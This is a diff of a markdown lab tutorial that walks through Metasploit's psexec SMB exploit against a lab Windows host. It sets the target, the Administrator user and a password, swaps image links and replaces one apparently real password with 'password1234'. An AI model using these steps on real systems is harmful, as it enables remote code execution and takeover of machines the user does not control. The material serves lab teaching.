@@ -86,7 +86,7 @@ Next, run the following command:
 use exploit/windows/smb/psexec
 ```
 
-![](attachments/windowscli_useexploit.png)
+<img width="677" height="88" alt="2026-03-15_23-36" src="https://github.com/user-attachments/assets/3918ae2d-9018-46e0-9e63-41536cafed35" />
 
 We will continue by running this command to set the location of the payload:
 
@@ -100,7 +100,7 @@ We also need to set the **RHOST IP** for the Windows system by using the followi
 set RHOST win.cloudlab.lan
 ```
 
-![](attachments/windowscli_sets.png)
+<img width="711" height="108" alt="2026-03-15_23-39" src="https://github.com/user-attachments/assets/68a2b59f-01ae-4500-88cc-563275be4cb7" />
 
 Next, we need to set the **SMB** username and password. 
 
@@ -109,7 +109,7 @@ set SMBUSER Administrator
 ```
 
 ```bash
-set SMBPASS T@GEq5%r2XJh
+set SMBPASS password1234
 ```
 
 >[!NOTE]
@@ -119,7 +119,7 @@ set SMBPASS T@GEq5%r2XJh
 
 It should look like this:
 
-![](attachments/windowscli_setuserpass.png)
+<img width="556" height="81" alt="2026-03-15_23-40" src="https://github.com/user-attachments/assets/293e8c74-5e42-4108-b52e-b94f48536cdb" />
 
 Now, we can run the exploit command
 
